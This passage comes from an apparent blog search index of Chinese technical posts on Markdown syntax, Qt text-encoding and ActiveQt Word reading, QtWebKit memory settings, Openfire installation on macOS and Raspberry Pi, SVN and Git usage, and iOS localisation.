Search&quot;) or\n[MSN](http://search.msn.com/ &quot;MSN Search&quot;).\n\n参考式的链接其实重点不在于它比较好写，而是它比较好读，比较一下上面的范例，使用参考式的文章本身只有 81 个字符，但是用行内形式的却会增加到 176 个字元，如果是用纯 HTML 格式来写，会有 234 个字元，在 HTML 格式中，标签比文本还要多。\n使用 Markdown 的参考式链接，可以让文件更像是浏览器最后产生的结果，让你可以把一些标记相关的元数据移到段落文字之外，你就可以增加链接而不让文章的阅读感觉被打断。\n强调\n\nMarkdown 使用星号（*）和底线（_）作为标记强调字词的符号，被 * 或 _ 包围的字词会被转成用 &lt;em&gt; 标签包围，用两个 * 或 _ 包起来的话，则会被转成 &lt;strong&gt;，例如：\n*single asterisks*\n\n_single underscores_\n\n**double asterisks**\n\n__double underscores__\n\n会转成：\n&lt;em&gt;single asterisks&lt;/em&gt;\n\n&lt;em&gt;single underscores&lt;/em&gt;\n\n&lt;strong&gt;double asterisks&lt;/strong&gt;\n\n&lt;strong&gt;double underscores&lt;/strong&gt;\n\n你可以随便用你喜欢的样式，唯一的限制是，你用什么符号开启标签，就要用什么符号结束。\n强调也可以直接插在文字中间：\nun*frigging*believable\n\n但是如果你的 * 和 _ 两边都有空白的话，它们就只会被当成普通的符号。\n如果要在文字前后直接插入普通的星号或底线，你可以用反斜线：\n\\*this text is surrounded by literal asterisks\\*\n\n代码\n\n如果要标记一小段行内代码，你可以用反引号把它包起来（`），例如：\nUse the `printf()` function.\n\n会产生：\n&lt;p&gt;Use the &lt;code&gt;printf()&lt;/code&gt; function.&lt;/p&gt;\n\n如果要在代码区段内插入反引号，你可以用多个反引号来开启和结束代码区段：\n``There is a literal backtick (`) here.``\n\n这段语法会产生：\n&lt;p&gt;&lt;code&gt;There is a literal backtick (`) here.&lt;/code&gt;&lt;/p&gt;\n\n代码区段的起始和结束端都可以放入一个空白，起始端后面一个，结束端前面一个，这样你就可以在区段的一开始就插入反引号：\nA single backtick in a code span: `` ` ``\n\nA backtick-delimited string in a code span: `` `foo` ``\n\n会产生：\n&lt;p&gt;A single backtick in a code span: &lt;code&gt;`&lt;/code&gt;&lt;/p&gt;\n\n&lt;p&gt;A backtick-delimited string in a code span: &lt;code&gt;`foo`&lt;/code&gt;&lt;/p&gt;\n\n在代码区段内，&amp; 和尖括号都会被自动地转成 HTML 实体，这使得插入 HTML 原始码变得很容易，Markdown 会把下面这段：\nPlease don&#39;t use any `&lt;blink&gt;` tags.\n\n转为：\n&lt;p&gt;Please don&#39;t use any &lt;code&gt;&amp;lt;blink&amp;gt;&lt;/code&gt; tags.&lt;/p&gt;\n\n你也可以这样写：\n`&amp;#8212;` is the decimal-encoded equivalent of `&amp;mdash;`.\n\n以产生：\n&lt;p&gt;&lt;code&gt;&amp;amp;#8212;&lt;/code&gt; is the decimal-encoded\nequivalent of &lt;code&gt;&amp;amp;mdash;&lt;/code&gt;.&lt;/p&gt;\n\n图片\n\n很明显地，要在纯文字应用中设计一个「自然」的语法来插入图片是有一定难度的。\nMarkdown 使用一种和链接很相似的语法来标记图片，同样也允许两种样式： 行内式和参考式。\n行内式的图片语法看起来像是：\n![Alt text](/path/to/img.jpg)\n\n![Alt text](/path/to/img.jpg &quot;Optional title&quot;)\n\n详细叙述如下：\n\n一个惊叹号 !\n接着一个方括号，里面放上图片的替代文字\n接着一个普通括号，里面放上图片的网址，最后还可以用引号包住并加上选择性的 ‘title’ 文字。\n\n参考式的图片语法则长得像这样：\n![Alt text][id]\n\n「id」是图片参考的名称，图片参考的定义方式则和连结参考一样：\n[id]: url/to/image  &quot;Optional title attribute&quot;\n\n到目前为止， Markdown 还没有办法指定图片的宽高，如果你需要的话，你可以使用普通的 &lt;img&gt; 标签。\n\n其它\n\n自动链接\n\nMarkdown 支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用尖括号包起来， Markdown 就会自动把它转成链接。一般网址的链接文字就和链接地址一样，例如：\n&lt;http://example.com/&gt;\n\nMarkdown 会转为：\n&lt;a href=&quot;http://example.com/&quot;&gt;http://example.com/&lt;/a&gt;\n\n邮址的自动链接也很类似，只是 Markdown 会先做一个编码转换的过程，把文字字符转成 16 进位码的 HTML 实体，这样的格式可以糊弄一些不好的邮址收集机器人，例如：\n&lt;address@example.com&gt;\n\nMarkdown 会转成：\n&lt;a href=&quot;&amp;#x6D;&amp;#x61;i&amp;#x6C;&amp;#x74;&amp;#x6F;:&amp;#x61;&amp;#x64;&amp;#x64;&amp;#x72;&amp;#x65;\n&amp;#115;&amp;#115;&amp;#64;&amp;#101;&amp;#120;&amp;#x61;&amp;#109;&amp;#x70;&amp;#x6C;e&amp;#x2E;&amp;#99;&amp;#111;\n&amp;#109;&quot;&gt;&amp;#x61;&amp;#x64;&amp;#x64;&amp;#x72;&amp;#x65;&amp;#115;&amp;#115;&amp;#64;&amp;#101;&amp;#120;&amp;#x61;\n&amp;#109;&amp;#x70;&amp;#x6C;e&amp;#x2E;&amp;#99;&amp;#111;&amp;#109;&lt;/a&gt;\n\n在浏览器里面，这段字串（其实是 &lt;a href=&quot;mailto:address@example.com&quot;&gt;address@example.com&lt;/a&gt;）会变成一个可以点击的「address@example.com」链接。\n（这种作法虽然可以糊弄不少的机器人，但并不能全部挡下来，不过总比什么都不做好些。不管怎样，公开你的信箱终究会引来广告信件的。）\n反斜杠\n\nMarkdown 可以利用反斜杠来插入一些在语法中有其它意义的符号，例如：如果你想要用星号加在文字旁边的方式来做出强调效果（但不用 &lt;em&gt; 标签），你可以在星号的前面加上反斜杠：\n\\*literal asterisks\\*\n\nMarkdown 支持以下这些符号前面加上反斜杠来帮助插入普通的符号：\n\\   反斜线\n`   反引号\n*   星号\n_   底线\n&#123;&#125;  花括号\n[]  方括号\n()  括弧\n#   井字号\n+   加号\n-   减号\n.   英文句点\n!   惊叹号\n\n感谢\n\n感谢 leafy7382 协助翻译，hlb、Randylien 帮忙润稿，ethantw 的汉字标准格式・CSS Reset， WM 回报文字错误。\n感谢 fenprace，addv。\n\nMarkdown 免费编辑器\n\nWindows 平台\n\nMarkdownPad\nMarkPad\n\nLinux 平台\n\nReText\n\nMac 平台\n\nMou\n\n在线编辑器\n\nMarkable.in\nDillinger.io\n\n浏览器插件\n\nMaDe (Chrome)\n\n高级应用\n\nSublime Text 2 + MarkdownEditing &#x2F; 教程\n\n*** 如有更好的 Markdown 免费编辑器推荐，请到这里反馈，谢谢！\n来源链接:http://wowubuntu.com/markdown/\n","categories":["Manual"],"tags":["markdown"]},{"title":"Qt中文乱码","url":"/2014/10/13/Qt-Chinese-garbled/","content":"解决办法    QTextCodec *codec = QTextCodec::codecForName(&quot;UTF-8&quot;);    QTextCodec::setCodecForLocale(QTextCodec::codecForLocale());#if (QT_VERSION &lt;= QT_VERSION_CHECK(5, 0, 0))    QTextCodec::setCodecForCStrings(QTextCodec::codecForLocale());    QTextCodec::setCodecForTr(codec);#endif\n乱码出现的原因QString内部采用的是 Unicode，它可以同时存放GBK中的字符”我是汉字”,BIG5中的字符”扂岆犖趼” 以及Latin-1中的字符”ÎÒÊÇºº×Ö”。当你需要从窄字符串 char* 转成Unicode的QString字符串的，你需要告诉QString你的这串char* 中究竟是什么编码？GBK、BIG5、Latin-1？在你不告诉它的情况下，它默认选择了Latin-1，于是8个字符”ÎÒÊÇºº×Ö”的unicode码被存进了QString中。最终，8个Latin字符出现在你期盼看到4中文字符的地方，所谓的乱码出现了。网上有很多方法介绍直接在main.cpp里设置：\nQTextCodec *codec = QTextCodec::codecForName(&quot;UTF-8&quot;);QTextCodec::setCodecForTr(codec);QTextCodec::setCodecForLocale(codec);QTextCodec::setCodecForCStrings(codec);\n其实这在某些情况下也是有问题的，因为程序可能读到系统的中文路径，或者调用中文路径下的外部程序，这时候如果系统是gb2312就有问题了。因为中文路径的编码是采用utf-8存到QString里的，系统读中文路径解码的时候采用的却是系统的gb2312，所以会调不起带中文路径的外部程序。以上问题下面方法可以解决：\nQTextCodec *codec = QTextCodec::codecForName(&quot;UTF-8&quot;);QTextCodec::setCodecForTr(codec);QTextCodec::setCodecForLocale(QTextCodec::codecForLocale());QTextCodec::setCodecForCStrings(QTextCodec::codecForLocale());\n对于外部字符串编码解码全部采用本地编码。参考链接：http://blog.csdn.net/brave_heart_lxl/article/details/7186631\n","categories":["Qt"],"tags":["中文乱码"]},{"title":"Qt读取MS-Word文档内容","url":"/2014/10/13/Qt-read-ms-word/","content":"Qt读取MS Word&#x2F;Excel&#x2F;Powerpoint等主要通过ActiveQt来实现。实际上是调用MS Word的ActiveX APIs。一下代码是读取word中的所有的文本。\nQAxObject wordApplication(&quot;Word.Application&quot;);QAxObject *documents = wordApplication.querySubObject(&quot;Documents&quot;);QAxObject* document = documents-&gt;querySubObject(&quot;Open(const QString&amp;, bool)&quot;, m_strWordFilePath, true);QAxObject* words  = document-&gt;querySubObject(&quot;Words&quot;);QString textResult;int countWord = words-&gt;dynamicCall(&quot;Count()&quot;).toInt();for (int a = 0; a &lt;= countWord; a++)&#123;\ttextResult.append(words-&gt;querySubObject(&quot;Item(int)&quot;, a)-&gt;dynamicCall(&quot;Text()&quot;).toString());&#125;wordApplication.dynamicCall(&quot;Quit (void)&quot;);\n详细介绍：Word程序初始化：QAxObject wordApplication(&quot;Word.Application&quot;)也可以通过QAxWidget wordApplication(&quot;Word.Application&quot;)，都是初始化com组件对象。word程序的子对象可以通过QAxBase::querySubObject()来获得。e.g:QAxObject *documents = wordApplication.querySubObject(&quot;Documents&quot;);任何涉及到word对象的方法调用都可以通过QAxBase::dynamicCall ()来实现。e.g:activeDocument-&gt;dynamicCall(&quot;Close(void)&quot;);参考链接：http://qt-project.org/wiki/Using_ActiveX_Object_in_QThttp://qt-project.org/wiki/Handling_Document_Formatshttp://qt-project.org/wiki/Handling_Microsoft_Word_file_formathttps://qt-project.org/search/tag/ms~wordhttp://qt-project.org/forums/viewthread/20341\n","categories":["Qt"],"tags":["ActiveX"]},{"title":"降低QtWebkit内存使用量","url":"/2014/11/05/QtWebKit-decrease-memory/","content":"在QtWebkit的QWebView加载网页的时候，会随着每加载一次网页内存就会增加。为解决这个问题可以通过以下代码解决。  \nQWebSettings::globalSettings()-&gt;setAttribute(QWebSettings::AutoLoadImages, false);QWebSettings::globalSettings()-&gt;setMaximumPagesInCache(0);QWebSettings::globalSettings()-&gt;setObjectCacheCapacities(0, 0, 0);QWebSettings::globalSettings()-&gt;setOfflineStorageDefaultQuota(0);QWebSettings::globalSettings()-&gt;setOfflineWebApplicationCacheQuota(0);QWebSettings::globalSettings()-&gt;clearIconDatabase();QWebSettings::globalSettings()-&gt;clearMemoryCaches();\n其中QWebSettings::globalSettings()-&gt;clearIconDatabase();  QWebSettings::globalSettings()-&gt;clearMemoryCaches();可以在下一次加载开始前调用，每次调用后会将上一次加载过的页面内存清空。  \n详细解析\nvoid QWebSettings::setMaximumPagesInCache(int pages)设置在内存中缓存的最大页数为pages。缓存页可以在浏览历史页面的时候提供更好的用户体验。详细介绍参考：http://webkit.org/blog/427/webkit-page-cache-i-the-basics/  \n\nvoid QWebSettings::setObjectCacheCapacities(int cacheMinDeadCapacity, int cacheMaxDead, int totalCapacity)指定已死对象的内存容大小。已死包括stylesheets和scripts。cacheMinDeadCapacity指定当缓存在压力下，已死对象消耗的最小字节数。cacheMaxDead 是当缓存没在压力下，已死对象应该消耗的最大字节数。totalCapacity 指定缓存全部消耗的最大字节数。缓存默认是开启的。通过setObjectCacheCapacities(0, 0, 0)来禁用缓存。设置非零来开启。\n\nvoid QWebSettings::setOfflineStorageDefaultQuota(qint64 maximumSize)设置新的离线存储数据库的默认最大值为maximumSize。\n\nvoid QWebSettings::setOfflineWebApplicationCacheQuota(qint64 maximumSize)设置离线web应用的缓存最大值为maximumSize。\n\nvoid QWebSettings::clearIconDatabase()清除图标数据库。\n\nvoid QWebSettings::clearMemoryCaches()通过JavaScript垃圾回收器和清空比如页面、对象和字体等缓存，尽可能多地释放内存。\n\n\nWebkit Page Cache机制https://www.webkit.org/blog/427/webkit-page-cache-i-the-basics/https://trac.webkit.org/wiki/MemoryCache  \n参考链接http://qt-project.org/forums/viewthread/11105http://webkit.sed.hu/content/disabling-cache\n","categories":["Qt"],"tags":["WebKit"]},{"title":"Mac OS 10.11 Openfire安装","url":"/2015/11/03/Openfire-install/","content":"Mac OS 10.11 Openfire无法启动问题安装好openfire_3_10_2.dmg后，无法通过【系统偏好设置】中的Openfire图标启动服务器。1、JDK版本：1.8.65。经测试需要JDK 1.7版本以上。2、Openfire版本：3.10.2  \n最终解决办法：在终端中执行命令   \nsudo sucd /usr/local/openfire/binexport JAVA_HOME=`/usr/libexec/java_home`sh ./openfire.sh\n\n卸载Openfire只需要在openfire关闭的情况下，执行以下的命令即可：  \nsudo rm -rf /Library/PreferencePanes/Openfire.prefPanesudo rm -rf /usr/local/openfiresudo rm -rf /Library/LaunchDaemons/org.jivesoftware.openfire.plist\n\n","categories":["MacOS"],"tags":["Openfire","XMPP"]},{"title":"树莓派安装Openfire搭建XMPP服务器","url":"/2015/11/22/RaspberryPi-install-openfire/","content":"树莓派基本配置\n树莓派设备安装RASPBIAN系统  \n\n使用raspi-config进行配置  \n参考http://blog.csdn.net/xdw1985829/article/details/38816375\n\n更新系统到最新sudo apt-get update &amp; sudo apt-get upgrade\n\n\n安装JRE环境sudo apt-get install openjdk-7-jre\n安装MySQLsudo apt-get install mysql-server\n安装PHPMyAdminsudo apt-get install phpmyadmin\n安装Openfire服务下载：wget http://download.igniterealtime.org/openfire/openfire_3.10.3_all.deb\n安装：sudo dpkg -i openfire_3.10.3_all.deb\n打开PHPMyAdmin创建数据库\n创建数据库openfire\n导入数据库文件openfire_mysql.sql，可以在/usr/share/openfire/resources/database目录中，找到每一个对应数据库类型的SQL文件。这个地方我使用的是MySQL。\n\n启动Openfire并进行初始设置通过命令可以对Openfire服务进行启动&#x2F;停止&#x2F;重启&#x2F;强制加载 /etc/init.d/openfire &#123;start|stop|restart|force-reload&#125;   \n通过启动sudo /etc/init.d/openfire start并访问http://[openfire server ip]:9090进行初始设置\n","categories":["Linux"],"tags":["Openfire","XMPP","Raspberrypi"]},{"title":"SVN&Git","url":"/2015/12/24/SVN-Git/","content":"PS：本文所有$符号之后为在终端中执行的命令。\n版本控制系统版本控制版本控制（Version Control）的作用是追踪文件的变化。为什么需要版本控制？简单说，就是当你出错了，可以很容易地回到没出错时的状态。\n你可能已经在不知不觉中，布置了自己的版本控制系统。比如，创建了类似下面这样的文件名：\n\n论文_0510.doc\n论文_0514.doc\n论文_0521.doc\n论文_修改版.doc\n论文_最终不修改版.doc\n\n这就是软件中为什么有”Save As”命令的原因。它使得你可以在不破坏源文件的基础上，得到一个类似的新文件。文件的多版本保存是一个常见问题，通常的解决办法是这样的：\n\n做一个文件备份（比如Document.old.txt）。\n在文件名中加入版本号或日期（比如Document_V1.txt，DocumentMarch2007.txt）。\n在多人编辑的环境下，共享一个文件目录，并且要求每个人编辑完以后，在文件上做出标识。\n\n什么是版本控制系统（VCS）？大型的、频繁修改的、多人编写的软件项目，需要一个版本控制系统（简称VCS，行话叫做”文件数据库”），追踪文件的变化，避免出现混乱。\n一次典型的使用过程是这样的：\n 爱丽丝add一个文件（list.txt）进入repo。然后，她又把这个文件check out，做了一次编辑（在文件中加入milk这个单词）。接着，她将修改后的文件check in，并附有一条checking message（”加入了新的条目”）。第二天早上，鲍勃update了他本地的working set，看到了list.txt的最新修订版，其中包含了单词”milk”。如果他使用changelog或diff，都可以发现前一天爱丽丝加入”milk”这个词。\n网上有许多VCS软件可供选择，并且都有详细的教程或手册，比如SVN、CVS、RCS、Git、Perforce等等。\n版本库版本库又名仓库，英文名repository，你可以简单理解成一个目录，这个目录里面的所有文件都可以被版本控制系统管理起来，每个文件的修改、删除，都能跟踪，以便任何时刻都可以追踪历史，或者在将来某个时刻可以“还原”。\n\n\n\nSVN在Mac环境下，由于Mac自带了SVN的服务器端和客户端功能，所以我们可以在不装任何第三方软件的前提下使用SVN功能，不过还需做一下简单的配置。\n为什么使用SVN\n** 进行权限管理，针对不同的人，开放不同的权限。 ** 比如Alex是进行A项目的，Bob进行B项目的，那么SVN可以有效的管理每个人看到的项目，Alex不可能获得Bob的项目，同样Bob也不可能获得Alex的项目。\n** 对于代码进行追踪，代码不会遗失。** 不如今天代码修改乱了，需要恢复到某一天的，那么我们只需要选择一下恢复的日期即可进行恢复。\n\n搭建SVN服务器1. 创建代码仓库，存储客户端上传的代码先在~/Desktop目录（这个目录可以是任意非中文路径）新建一个svn目录，以后可以在svn目录下创建多个仓库目录。\n打开终端，切换到该目录cd ~/Desktop/svn，创建一个learnsvn仓库，输入命令：svnadmin create ./learnsvn，执行成功后，会发现在该目录下多了一个LimitFree目录。\n2. 配置SVN的用户权限主要是修改.&#x2F;learnsvn&#x2F;conf目录下的三个文件\n\n打开svnserve.conf，将下列配置项前面的#和空格都去掉\n# anon-access = read  # auth-access = write  # password-db = passwd# authz-db = authz\n\nanon-access &#x3D; read代表匿名访问的时候是只读的，若改为anon-access &#x3D; none代表禁止匿名访问，需要帐号密码才能访问\n\n打开passwd，在[users]下面添加帐号和密码\n[users]# harry = harryssecret# sally = sallyssecretchaosky = 123student = 123456\n\n帐号是chaosky，密码是123\n\n打开authz，配置用户组和权限\n我们可以将在passwd里添加的用户分配到不同的用户组里，以后的话，就可以对不同用户组设置不同的权限，没有必要对每个用户进行单独设置权限。\n在[groups]下面添加组名和用户名，多个用户之间用逗号(,)隔开\n[groups]  topgroup=chaosky,student\n\n说明chaosky和student都是属于topgroup这个组的，接下来再进行权限配置。\n使用[&#x2F;]代表svn服务器中的所有资源库\n[/]  @topgroup = rw\n\n上面的配置说明topgroup这个组中的所有用户对所有资源库都有读写(rw)权限，组名前面要用@\n如果是用户名，不用加@，比如chaosky这个用户有读写权限\n[/]  chaosky = rw\n\n3. 启动SVN服务器在终端输入命令：svnserve -d -r ~/Desktop/svn或svnserve -d -r ~/Desktop/svn/learnsvn\n没有任何提示就说明启动成功了\n4. 关闭SVN服务器打开活动监视器，输入svnserve，强制退出进程。\n使用SVN客户端功能SVN客户端有两种使用方式，命令行和GUI界面软件（CornerStone）\n命令行工具usage: svn &lt;subcommand&gt; [options] [args]Subversion command-line client.Type &#x27;svn help &lt;subcommand&gt;&#x27; for help on a specific subcommand.Type &#x27;svn --version&#x27; to see the program version and RA modules  or &#x27;svn --version --quiet&#x27; to see just the version number.Most subcommands take file and/or directory arguments, recursingon the directories.  If no arguments are supplied to such acommand, it recurses on the current directory (inclusive) by default.Available subcommands:   add   auth   blame (praise, annotate, ann)   cat   changelist (cl)   checkout (co)   cleanup   commit (ci)   copy (cp)   delete (del, remove, rm)   diff (di)   export   help (?, h)   import   info   list (ls)   lock   log   merge   mergeinfo   mkdir   move (mv, rename, ren)   patch   propdel (pdel, pd)   propedit (pedit, pe)   propget (pget, pg)   proplist (plist, pl)   propset (pset, ps)   relocate   resolve   resolved   revert   status (stat, st)   switch (sw)   unlock   update (up)   upgradeSubversion is a tool for version control.For additional information, see http://subversion.apache.org/\n\nCornerStone添加代码仓库填写SVN仓库信息基本操作checkout（检出）add（添加文件）delete（删除文件）modify （修改文件）commit（提交）update（更新）resolve conflict（解决冲突）revert（恢复初始状态）Git安装Git直接从AppStore安装Xcode，Xcode集成了Git，不过默认没有安装，你需要运行命令xcode-select --install安装“Command Line Tools”，点“Install”就可以完成安装了。\n创建版本库\n选择一个合适的地方，创建一个空目录：\n$ mkdir learngit$ cd learngit\n\n通过git init命令把这个目录变成Git可以管理的仓库：\n$ git initInitialized empty Git repository in /Users/Chaosky/Desktop/learngit/.git/\n\n瞬间Git就把仓库建好了，而且告诉你是一个空的仓库（empty Git repository），细心的读者可以发现当前目录下多了一个.git的目录，这个目录是Git来跟踪管理版本库的，没事千万不要手动修改这个目录里面的文件，不然改乱了，就把Git仓库给破坏了。\n\n\n把文件添加到版本库\n编写一个README.md文件，内容如下：\nGit is a version control system.Git is free software.\n\n一定要放到learngit目录下（子目录也行），因为这是一个Git仓库，放到其他地方Git再厉害也找不到这个文件。\n\n用命令git add告诉Git，把文件添加到仓库：\n$ git add readme.txt\n\n执行上面的命令，没有任何显示，这就对了，Unix的哲学是“没有消息就是好消息”，说明添加成功。\n\n用命令git commit告诉Git，把文件提交到仓库：\n$ git commit -m &quot;wrote a readme file&quot;[master (root-commit) cb926e7] wrote a readme file1 file changed, 2 insertions(+)create mode 100644 readme.txt\n\n简单解释一下git commit命令，-m后面输入的是本次提交的说明，可以输入任意内容，当然最好是有意义的，这样你就能从历史记录里方便地找到改动记录。\ngit commit命令执行成功后会告诉你，1个文件被改动（我们新添加的readme.txt文件），插入了两行内容（readme.txt有两行内容）。\n为什么Git添加文件需要add，commit一共两步呢？因为commit可以一次提交很多文件，所以你可以多次add不同的文件，比如：\n$ git add file1.txt$ git add file2.txt file3.txt$ git commit -m &quot;add 3 files.&quot;\n\n工作区和暂存区\n工作区（Working Directory）就是你在电脑里能看到的目录。\n\n版本库（Repository）Git的版本库里存了很多东西，其中最重要的就是称为stage（或者叫index）的暂存区，还有Git为我们自动创建的第一个分支master，以及指向master的一个指针叫HEAD。\n\n前面讲了我们把文件往Git版本库里添加的时候，是分两步执行的：\n第一步是用git add把文件添加进去，实际上就是把文件修改添加到暂存区；\n\n第二步是用git commit提交更改，实际上就是把暂存区的所有内容提交到当前分支。\n\n你可以简单理解为，需要提交的文件修改通通放到暂存区，然后，一次性提交暂存区的所有修改。\n\n\n版本库管理\ngit status查看仓库当前的状态，要随时掌握工作区的状态，使用git status命令。\n\ngit diff如果git status告诉你有文件被修改过，用git diff可以查看修改内容。\n\ngit log显示从最近到最远的提交日志。在Git中，用HEAD表示当前版本，也就是最新的提交，上一个版本就是HEAD^ ，上上一个版本就是HEAD^^ ，当然往上100个版本写100个^比较容易数不过来，所以写成HEAD~100。\n\ngit reset –hard commit_id在版本的历史之间进行切换，commit_id为提交版本的id。\n\ngit reflog用来记录你的每一次命令\n\n撤销修改场景1：当你改乱了工作区某个文件的内容，想直接丢弃工作区的修改时，用命令git checkout -- README.md。\n场景2：当你不但改乱了工作区某个文件的内容，还添加到了暂存区时，想丢弃修改，分两步，第一步用命令git reset HEAD README.md，就回到了场景1，第二步按场景1操作。\n\ngit rm用于删除一个文件。如果一个文件已经被提交到版本库，那么你永远不用担心误删，但是要小心，你只能恢复文件到最新版本，你会丢失最近一次提交后你修改的内容。\n\n\n远程仓库分布式版本控制系统通常也有一台充当“中央服务器”的电脑，而充当”中央服务器”角色的仓库就是远程仓库，但这个服务器的作用仅仅是用来方便“交换”大家的修改，没有它大家也一样干活，只是交换修改不方便而已。\n如果有自己的私有仓库地址，则无需执行下面几个操作。\n\n注册远程仓库账号\nGit@OSC：开源中国Git托管平台\n地址：http://git.oschina.net\n\nGithub：世界最大的Git项目托管平台\n地址：https://github.com\n\nCoding：国内新兴的Git托管平台\n地址：https://coding.net\n\n\n\n添加公钥到Git托管平台\n生成公钥SSH Keys：SSH key 可以让你在你的电脑和 Git托管平台之间建立安全的加密连接。\n你可以按如下命令来生成sshkey：\n$ ssh-keygen -t rsa -C &quot;xxxxx@xxxxx.com&quot;\n\n其中xxxxx@xxxxx.com需要填写邮箱信息\n生成SSH key时，如果不清楚需要输入的信息，可以全部输入Enter键。\n\n查看你的public key，并把他添加到Git托管平台$ cat ~/.ssh/id_rsa.pub\n\n具体添加的位置，查看具体的托管平台。一般来说，在个人资料中可以找到SSH-KEYS类似的字样就是添加公钥的地方。\n\n测试是否添加成功测试Git@OSC输入命令：\n$ ssh -T git@git.oschina.netWelcome to Git@OSC, yourname!\n\n测试Github输入命令：\n$ ssh -T git@github.comHi xwal! Youve successfully authenticated, but GitHub does not provide shell access.\n\n生成SSH key只需要生成一次，不同的网站再将公钥拷贝到网站上即可。\n\n在Git托管平台上创建项目\n添加远程仓库关联一个远程仓库命令：\n$ git remote add origin git@server-name:path/repo-name.git\n\n其中origin表示远程仓库的别名，默认为origin\ngit@server-name:path/repo-name.git表示项目在Git托管平台上的ssh 地址。\n关联远程仓库只需要执行上面的命令一次即可。\n关联后，第一次推送master分支的所有内容命令：\n$ git push -u origin master\n\n此后，每次本地提交后，只要有必要，推送最新修改就可以使用命令：\n$ git push origin master\n\n分布式版本系统的最大好处之一是在本地工作完全不需要考虑远程库的存在，也就是有没有联网都可以正常工作，而SVN在没有联网的时候是拒绝干活的！当有网络的时候，再把本地提交推送一下就完成了同步，真是太方便了！\n\n克隆远程仓库$ git clone git@server-name:path/repo-name.git &lt;repo-name&gt;\n\n从远程分支获取最新版本到本地，有2个命令\ngit fetch：相当于是从远程获取最新版本到本地，不会自动merge\n\n  $ git fetch origin master$ git log -p master..origin/master$ git merge origin/master\n\n  以上命令的含义：\n  首先从远程的origin的master主分支下载最新的版本到origin&#x2F;master分支上;\n  然后比较本地的master分支和origin&#x2F;master分支的差别;\n  最后进行合并。\n\ngit pull：相当于是从远程获取最新版本并merge到本地\n$ git pull origin master\n\n上述命令其实相当于git fetch 和 git merge\n\n\n在实际使用中，git fetch更安全一些\n因为在merge前，我们可以查看更新情况，然后再决定是否合并\n\n\n分支管理Git鼓励大量使用分支：\n查看分支：git branch\n创建分支：git branch &lt;name&gt;\n切换分支：git checkout &lt;name&gt;\n创建+切换分支：git checkout -b &lt;name&gt;\n合并某分支到当前分支：git merge &lt;name&gt;\n删除分支：git branch -d &lt;name&gt;\n当Git无法自动合并分支时，就必须首先解决冲突。解决冲突后，再提交，合并完成。\n用git log --graph命令可以看到分支合并图。\n推送分支，就是把该分支上的所有本地提交推送到远程库。推送时，要指定本地分支，这样，Git就会把该分支推送到远程库对应的远程分支上：\n$ git push origin master\n\n\n\n标签管理git tag &lt;name&gt;用于新建一个标签，默认为HEAD，也可以指定一个commit id；\ngit tag -a &lt;tagname&gt; -m &quot;blablabla...&quot;可以指定标签信息；\ngit tag -s &lt;tagname&gt; -m &quot;blablabla...&quot;可以用PGP签名标签；\ngit tag可以查看所有标签\ngit push origin &lt;tagname&gt;可以推送一个本地标签；\ngit push origin -—tags可以推送全部未推送过的本地标签；\ngit tag -d &lt;tagname&gt;可以删除一个本地标签；\ngit push origin :refs/tags/&lt;tagname&gt;可以删除一个远程标签。\nGit常用命令速查表\n参考文章\nhttp://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000\n参考书籍：《Git权威指南》\n\nSVN vs Git （集中式 vs 分布式）先说集中式版本控制系统，版本库是集中存放在中央服务器的，而干活的时候，用的都是自己的电脑，所以要先从中央服务器取得最新的版本，然后开始干活，干完活了，再把自己的活推送给中央服务器。中央服务器就好比是一个图书馆，你要改一本书，必须先从图书馆借出来，然后回到家自己改，改完了，再放回图书馆。\n\n集中式版本控制系统最大的毛病就是必须联网才能工作。\n那分布式版本控制系统与集中式版本控制系统有何不同呢？首先，分布式版本控制系统根本没有“中央服务器”，每个人的电脑上都是一个完整的版本库，这样，你工作的时候，就不需要联网了，因为版本库就在你自己的电脑上。既然每个人电脑上都有一个完整的版本库，那多个人如何协作呢？比方说你在自己电脑上改了文件A，你的同事也在他的电脑上改了文件A，这时，你们俩之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。\n和集中式版本控制系统相比，分布式版本控制系统的安全性要高很多，因为每个人电脑里都有完整的版本库，某一个人的电脑坏掉了不要紧，随便从其他人那里复制一个就可以了。而集中式版本控制系统的中央服务器要是出了问题，所有人都没法干活了。\n在实际使用分布式版本控制系统的时候，其实很少在两人之间的电脑上推送版本库的修改，因为可能你们俩不在一个局域网内，两台电脑互相访问不了，也可能今天你的同事病了，他的电脑压根没有开机。因此，分布式版本控制系统通常也有一台充当“中央服务器”的电脑，但这个服务器的作用仅仅是用来方便“交换”大家的修改，没有它大家也一样干活，只是交换修改不方便而已。\n\n","categories":["iOS"],"tags":["Tools","SVN","Git"]},{"title":"国际化&本地化","url":"/2015/12/28/i18n-l10n/","content":"概念国际化是指为应用程序提供一个用来支持不同语言的框架的过程，在代码设计上加入能方便的移植到其他国家和地区的特性。I18n是Internationalization的简写。\n本地化是使你的应用程序支持特定地区的过程，将具有国际化支持的代码翻译成本国或地区的语言，是本地用户更容易使用。l10n是Localization的简写。\n支持多语言，在英语语言环境设置显示相应的英文，在汉语环境下设置显示相应的中文。\n\n\n1. 在工程菜单info选项卡下的localizations中添加新语言\n2. 创建 strings 文件\n新建文件\n\n如果要对APP的设置（比如：应用程序包的显示名称）进行本地化，需要对InfoPlist.strings进行本地化处理。Xcode 6 里面没有InfoPlist.strings了，那么需要我们自己创建一个。InfoPlist.strings有了之后系统会自动加载。\n\n选择新建文件,并在右边栏找到Localization属性\n\n\n在出现的对话框选择Localize\n\n\n将多语言勾上\n\n\n在English和Simplified中分别输入应用名\n\n\n\n运行一下-修改系统语言为中文和英文\n\n系统是英语环境 那么 会加载英文的文件\n系统是汉语环境 那么 会加载支持汉语的文件\n\n\n3. 代码中加载指定文件中的字符串\n自定义文件创建 一个.strings 文件，分别创建支持英语和中文的文件\n\n多语言的设置 格式 key &#x3D; value\n英文\n&quot;firstTitle&quot; = &quot;Limit&quot;;&quot;secondTitle&quot; = &quot;Reduce&quot;;&quot;thirdTitle&quot; = &quot;Free&quot;;&quot;fourthTitle&quot; = &quot;Subject&quot;;&quot;fifthTitle&quot; = &quot;Hot&quot;;\n\n汉语\n&quot;firstTitle&quot; = &quot;限免&quot;;&quot;secondTitle&quot; = &quot;降价&quot;;&quot;thirdTitle&quot; = &quot;免费&quot;;&quot;fourthTitle&quot; = &quot;专题&quot;;&quot;fifthTitle&quot; = &quot;热榜&quot;;\n\nNSLocalizedStringFromTable 通过多语言的文件加载多语言的字符串\n\n\n//key 多语言中要使用的字符串的key，tbl 